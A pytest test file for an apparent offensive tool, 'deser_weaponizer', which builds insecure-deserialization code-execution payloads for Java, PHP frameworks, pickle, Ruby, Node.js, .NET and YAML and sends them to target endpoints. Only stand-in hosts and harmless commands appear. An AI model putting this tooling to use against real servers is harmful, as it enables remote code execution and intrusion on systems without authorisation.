import base64
import json
from unittest import mock

import requests

from tools import deser_weaponizer as dw

MAGIC = b"\xac\xed\x00\x05"


class FakeResp:
    def __init__(self, status_code=200, text=""):
        self.status_code = status_code
        self.text = text
        self.headers = {}


class HandlerSession:
    def __init__(self, handler):
        self.handler = handler
        self.calls = []
        self.verify = True

    def post(self, url, **kwargs):
        self.calls.append((url, kwargs))
        return self.handler(url, kwargs)


class TestWriteHelpers:
    def test_write_utf(self):
        buf = bytearray()
        dw._java_write_utf(buf, "ab")
        assert bytes(buf) == b"\x00\x02ab"

    def test_write_string_null(self):
        buf = bytearray()
        dw._java_write_string(buf, None)
        assert bytes(buf) == b"\x70"

    def test_write_string_value(self):
        buf = bytearray()
        dw._java_write_string(buf, "ab")
        assert bytes(buf) == b"\x74\x00\x02ab"

    def test_write_blockdata(self):
        buf = bytearray()
        dw._java_write_blockdata(buf, b"xy")
        assert bytes(buf) == b"\x77\x02xy"

    def test_write_classdesc(self):
        buf = bytearray()
        dw._java_write_classdesc(buf, "Foo", 1)
        assert buf[0] == 0x72
        assert b"Foo" in bytes(buf)
        assert buf[-1] == 0x78

    def test_tc_null(self):
        buf = bytearray()
        dw._java_tc_null(buf)
        assert bytes(buf) == b"\x70"


class TestJavaBuilders:
    def test_urldns(self):
        payload = dw.build_java_urldns("http://cb.test")
        assert payload.startswith(MAGIC)
        assert b"java.net.URL" in payload
        assert b"cb.test" in payload

    def test_runtime(self):
        payload = dw.build_java_runtime_exec("id")
        assert payload.startswith(MAGIC)
        assert b"java.lang.Runtime" in payload

    def test_processbuilder(self):
        payload = dw.build_java_processbuilder("id")
        assert payload.startswith(MAGIC)
        assert b"java.lang.ProcessBuilder" in payload

    def test_jndi_ldap(self):
        payload = dw.build_java_jndi_ldap("ldap://cb.test:1")
        assert payload.startswith(MAGIC)
        assert b"LdapClient" in payload
        assert b"cb.test" in payload

    def test_commonscollections(self):
        payload = dw.build_java_commonscollections("id")
        assert payload.startswith(MAGIC)
        assert len(payload) == 59


class TestPhpBuilders:
    def test_rce(self):
        payload = dw.build_php_rce(cmd="id")
        assert payload.startswith("O:")
        assert "PHPExecPopen" in payload
        assert "id" in payload

    def test_laravel(self):
        payload = dw.build_php_laravel_rce(cmd="id")
        assert payload.startswith("O:")
        assert "Illuminate" in payload

    def test_codeigniter(self):
        payload = dw.build_php_codeigniter_rce(cmd="id")
        assert payload.startswith("O:")
        assert "CI_Controller" in payload

    def test_thinkphp(self):
        payload = dw.build_php_thinkphp_rce(cmd="id")
        assert payload.startswith("O:")
        assert "Think" in payload

    def test_wordpress(self):
        payload = dw.build_php_wordpress_rce(cmd="id")
        assert payload.startswith("O:")
        assert "WP_Object_Cache" in payload

    def test_drupal(self):
        payload = dw.build_php_drupal_rce(cmd="id")
        assert payload.startswith("O:")
        assert "Drupal" in payload

    def test_symfony(self):
        payload = dw.build_php_symfony_rce(cmd="id")
        assert payload.startswith("O:")
        assert "Symfony" in payload


class TestOtherBuilders:
    def test_python_subprocess(self):
        payload = dw.build_python_rce_subprocess("echo")
        assert isinstance(payload, bytes)
        assert b"check_output" in payload
        assert b"echo" in payload

    def test_python_eval(self):
        payload = dw.build_python_rce_eval("echo")
        assert isinstance(payload, bytes)
        assert b"echo" in payload

    def test_pickle_rce(self):
        payload = dw.build_pickle_rce("echo")
        assert isinstance(payload, bytes)
        assert b"system" in payload
        assert b"echo" in payload

    def test_ruby(self):
        payload = dw.build_ruby_rce("id")
        assert isinstance(payload, str)
        assert base64.b64decode(payload).startswith(b"\x04\x08")

    def test_nodejs(self):
        payload = dw.build_nodejs_rce("whoami")
        assert json.loads(payload)["rce"].find("whoami") >= 0

    def test_dotnet(self):
        decoded = base64.b64decode(dw.build_dotnet_rce("id"))
        assert len(decoded) == 17

    def test_yaml(self):
        payload = dw.build_yaml_rce("cb.test")
        assert "cb.test" in payload
        assert payload.startswith("!!")


class TestGeneratePayload:
    def test_unknown_technique(self):
        result = dw.generate_payload("nope")
        assert "Unknown technique" in result["error"]

    def test_java_urldns_custom_callback(self):
        result = dw.generate_payload("java_urldns", callback_url="http://cb.test")
        assert result["content_type"] == "application/x-java-serialized-object"
        assert b"cb.test" in base64.b64decode(result["b64"])

    def test_java_default_callback(self):
        result = dw.generate_payload("java_urldns")
        assert result["length"] > 0

    def test_php_roundtrip_and_truncation(self):
        result = dw.generate_payload("php_generic", cmd="A" * 300)
        assert result["content_type"] == "application/x-php-serialized"
        assert len(result["raw"]) == 200
        assert result["length"] > 200
        assert base64.b64decode(result["b64"]).decode() == dw.build_php_rce(cmd="A" * 300)

    def test_bytes_technique_raw_is_list(self):
        result = dw.generate_payload("python_pickle", cmd="id")
        assert isinstance(result["raw"], list)
        assert result["content_type"] == "application/python-pickle"

    def test_builder_exception(self):
        def boom(cmd="id"):
            raise RuntimeError("builder broke")

        with mock.patch.dict(dw.ALL_PAYLOADS, {"java_runtime": boom}):
            result = dw.generate_payload("java_runtime", cmd="id")
        assert result["error"] == "builder broke"

    def test_all_techniques_generate(self):
        for name in dw.ALL_PAYLOADS:
            result = dw.generate_payload(name)
            assert "error" not in result


class TestSendPayload:
    def _session(self, status=200, text="x" * 60):
        return HandlerSession(lambda url, kwargs: FakeResp(status, text))

    def test_java_posts_bytes(self):
        sess = self._session()
        result = dw.send_payload("http://t.test/deser", "p", technique="java_urldns", sess=sess)
        assert result["sent"] is True
        assert result["status"] == 200
        assert result["interesting"] is True
        url, kwargs = sess.calls[0]
        assert isinstance(kwargs["data"], bytes)
        assert kwargs["headers"]["Content-Type"] == "application/x-java-serialized-object"

    def test_python_posts_bytes(self):
        sess = self._session()
        result = dw.send_payload(
            "http://t.test/deser", "p", technique="python_pickle", cmd="id", sess=sess
        )
        assert result["sent"] is True
        assert isinstance(sess.calls[0][1]["data"], bytes)

    def test_nodejs_posts_json(self):
        sess = self._session()
        dw.send_payload("http://t.test/deser", "p", technique="nodejs_rce", cmd="whoami", sess=sess)
        assert sess.calls[0][1]["json"] == {"rce": "whoami"}

    def test_php_posts_via_url(self):
        sess = self._session()
        dw.send_payload(
            "http://t.test/deser?x=1", "p", technique="php_generic", cmd="id", sess=sess
        )
        url = sess.calls[0][0]
        assert "&p=O:" in url
        assert "comefrom" not in url

    def test_500_with_error_marker_not_interesting(self):
        sess = self._session(status=500, text="y" * 60 + "error!")
        result = dw.send_payload("http://t.test/deser", "p", technique="php_generic", sess=sess)
        assert result["sent"] is True
        assert "interesting" not in result

    def test_404_without_error_marker_interesting(self):
        sess = self._session(status=404, text="z" * 60)
        result = dw.send_payload("http://t.test/deser", "p", technique="php_generic", sess=sess)
        assert result["interesting"] is True

    def test_unknown_technique(self):
        result = dw.send_payload("http://t.test/deser", "p", technique="nope", sess=self._session())
        assert result["success"] is False
        assert result["error"]

    def test_request_exception(self):
        def handler(url, kwargs):
            raise requests.ConnectionError("boom")

        result = dw.send_payload(
            "http://t.test/deser",
            "p",
            technique="php_generic",
            sess=HandlerSession(handler),
        )
        assert result["sent"] is False
        assert result["error"] == "boom"

    def test_session_created_when_missing(self):
        sess = self._session()
        with mock.patch("requests.Session", return_value=sess):
            result = dw.send_payload("http://t.test/deser", "p", technique="php_generic", sess=None)
        assert result["sent"] is True


class TestCheck:
    def test_payload_inventory_without_target(self):
        result = dw.check()
        assert result["vulnerable"] is False
        assert result["payloads_generated"] == len(dw.ALL_PAYLOADS)
        assert len(result["payloads"]) == len(dw.ALL_PAYLOADS)
        assert result["recommendations"]

    def test_target_interesting(self):
        with mock.patch.object(
            dw, "send_payload", return_value={"interesting": True, "status": 200}
        ):
            result = dw.check("http://t.test/deser", "p")
        assert result["vulnerable"] is True
        assert len(result["send_results"]) == 3
        assert result["findings"]

    def test_target_not_interesting(self):
        with mock.patch.object(
            dw, "send_payload", return_value={"interesting": False, "status": 404}
        ):
            result = dw.check("http://t.test/deser", "p")
        assert result["vulnerable"] is False
        assert result["findings"] == []
